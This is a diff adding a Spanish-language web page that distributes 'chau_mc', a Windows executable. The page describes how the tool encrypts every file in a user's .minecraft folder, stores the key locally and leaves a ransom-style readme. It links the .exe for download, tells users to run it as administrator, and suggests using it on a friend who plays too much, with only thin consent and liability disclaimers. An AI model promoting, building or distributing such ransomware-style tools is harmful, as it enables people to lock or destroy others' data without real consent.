@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Información — chau_mc</title>
+    <style>
+        body { font-family: Inter, Arial, sans-serif; background:#f7f9fc; color:#111; padding:36px; }
+        .card { max-width:820px; margin:30px auto; background:#fff; border-radius:12px; padding:28px; box-shadow:0 8px 30px rgba(2,6,23,0.08); }
+        h1 { margin:0 0 8px; color:#0b63d6; }
+        .lead { margin:6px 0 18px; color:#333; }
+        ul { margin:8px 0 16px 20px; }
+        .warning { background:#fff4e5; border-left:4px solid #ffb020; padding:12px 14px; border-radius:6px; margin:12px 0; }
+        .tip { background:#edf7f1; border-left:4px solid #2fa664; padding:12px 14px; border-radius:6px; margin:12px 0; }
+        code { background:#f2f4f7; padding:2px 6px; border-radius:5px; font-family:monospace; }
+        footer { margin-top:18px; font-size:13px; color:#666; }
+    .boton {
+
+        color: #000000;
+        margin-top: 20px;
+        border-radius: 15px;
+        background-color: rgb(0, 0, 0);
+        padding: 10px;
+        background: rgb(251, 255, 0);
+    }
+    .Advertencia {
+
+        border-left:4px solid rgb(255, 230, 0);
+        color: rgb(0, 0, 0);
+        background-color: rgba(255, 255, 0, 0.4);
+        padding: 12px 20px;
+        margin-top: 20px;
+        border-radius: 10px;
+        padding: 20px 30px;
+    }
+    
+    .enlace-info {
+
+        color: rgb(0, 0, 0);
+        background-color: rgba(34, 255, 0, 0.4);
+        border-radius: 10px;
+        text-align: justify;
+        padding: 10px;
+    }
+
+    .texto {
+
+        text-align: center;
+        color: #000000;
+        background-color: rgba(255, 0, 0, 0.844);
+        border-radius: 10px;
+        padding: 10px 10px;
+    }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>chau_mc</h1>
+        <p class="lead">Un ejecutable que encripta los archivos de la carpeta <code>.minecraft</code> del usuario actual en Windows.</p>
+
+        <h3>Qué hace</h3>
+        <ul>
+            <li>Detecta automáticamente la ruta de <code>.minecraft</code> a través de la variable <code>APPDATA</code>.</li>
+            <li>Genera una clave de encriptación y la guarda como <code>key.key</code>.</li>
+            <li>Encripta los archivos dentro de <code>.minecraft</code>, incluyendo subcarpetas.</li>
+            <li>Crea un <code>readme.txt</code> en la carpeta principal indicando que los archivos fueron encriptados.</li>
+        </ul>
+
+        <div class="tip">
+            <strong>Si tu amigo es muy "viciado" al Minecraft:</strong>
+            <p>Este programa puede servir como una forma drástica de obligar a tomar un descanso del juego. <em>Úsalo sólo con el consentimiento de esa persona.</em> No es apropiado ni ético encriptar los archivos de alguien sin su permiso.</p>
+        </div>
+
+        <div class="warning">
+            <strong>Advertencia importante:</strong>
+            <p>Antes de ejecutar <code>chau_mc</code>, haz una copia de seguridad completa de <code>.minecraft</code>. Si se pierde <code>key.key</code>, no podrás recuperar los archivos. No uses esto contra otras personas sin su permiso.</p>
+        </div>
+
+        <h3>Notas técnicas</h3>
+        <ul>
+            <li>Funciona en Windows y utiliza la librería <code>cryptography.fernet</code>.</li>
+            <li>La clave (<code>key.key</code>) se guarda en la carpeta donde ejecutes el programa; mantenela segura.</li>
+            <li>El ejecutable no contiene instrucciones y link de descarga.</li>
+            <li>La web enla que encuentra contiene instrucciones del producto</li>
+            <br>
+            <br>
+            <a class="enlace-info" href="web/info.html">Click aqui para saber como usarlo de manera responsable</a>
+        </ul>
+        <br>
+        <a href="dist/chau_mc.exe" download="chau_mc.exe" class="boton">
+    Descargar Archivo
+</a>
+<h5 class="Advertencia">RECUERDDA EJECUTARLO COMO ADMINISTRADOR!</h5>
+<p class="texto">s0.mod® NO SE HACE RESPONSABLE DE NINGUN  DAÑO CAUSADO POR EL MAL USO DE ESTA HERRAMIENTA</p>
+        <footer>
+            Uso responsable — este software es para pruebas y aprendizaje. No es recomendable usarlo en sistemas ajenos ni en entornos donde perder datos sea crítico.
+        </footer>
+    </div>
+</body>
+</html>
